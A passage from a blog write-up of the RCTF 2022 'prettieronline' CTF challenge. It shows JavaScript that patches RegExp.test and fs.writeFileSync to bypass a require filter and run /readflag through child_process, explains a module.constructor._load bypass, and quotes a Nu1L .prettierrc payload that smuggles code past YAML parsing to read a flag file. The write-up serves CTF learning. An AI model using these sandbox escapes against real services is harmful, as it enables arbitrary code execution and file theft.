 <span class="token keyword">return</span> v <span class="token operator">==</span> <span class="token string">'child_process'</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token function">h</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>v<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

f <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'/readflag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
w <span class="token operator">=</span> fs<span class="token punctuation">.</span>writeFileSync<span class="token punctuation">;</span>
fs<span class="token punctuation">.</span><span class="token function-variable function">writeFileSync</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token string">'./dist/ret.js'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    b <span class="token operator">=</span> f
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">w</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>fs<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>First, change <code>RegExp.test</code> so that you can require anything, and then change the content to flag when <code>fs.writeFileSync</code> is called, and finally you can get the flag.</p>
<p>Author’s writeup: <a target="_blank" rel="noopener" href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline</a></p>
<p>It turns out that you don’t need to bypass require at all, you can just use <code>module.constructor._load(&#39;child_process&#39;)</code>, because require also calls this _load method inside: <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js">https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Loads a module at the given file path. Returns that module's</span>
<span class="token comment">// `exports` property.</span>
<span class="token class-name">Module</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">require</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">validateString</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ERR_INVALID_ARG_VALUE</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span>
                                    <span class="token string">'must be a non-empty string'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  requireDepth<span class="token operator">++</span><span class="token punctuation">;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> Module<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token comment">/* isMain */</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
    requireDepth<span class="token operator">--</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Finally, there is also a cool Nu1L payload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;*&#x2F;..&#x2F;app&#x2F;.prettierrc
#*&#x2F;const fs &#x3D; require(&#39;fs&#39;); var a &#x3D; fs.readFileSync(&quot;flag&quot;, &quot;utf-8&quot;);fs.writeFileSync(&quot;.&#x2F;dist&#x2F;ret.js&quot;,a);fs.chmodSync(&quot;.&#x2F;dist&#x2F;ret.js&quot;,0o444);process.addListener(&#39;uncaughtException&#39;, (err) &#x3D;&gt; &#123;console.log(&quot;ss&quot;,err);process.exit(0);&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>This utilizes the <code>require</code> function that outputs a string as mentioned earlier. Behind the scenes, it first uses YAML parse, so anything after the <code>#</code> symbol is a comment. The path part uses <code>/*</code> combined with the second line’s <code>*/</code> to become valid JS. Tql!</p>
<p>Finally, here are other writeups that were found:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.ctfiot.com/85535.html">RCTF 2022 WriteUp By F61d</a></li>
<li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1460829.html">2022RCTF WriteUp by Venom</a></li>
</ol>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/12/26/en/ctf-2022-web-js-summary/">Summary of CTF Web Frontend and JS Challenges in 2022</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/12/08/en/ctf-js-notes/">Notes on Several CTF Challenges Related to Web and JS</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/12/14/rctf-2022-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>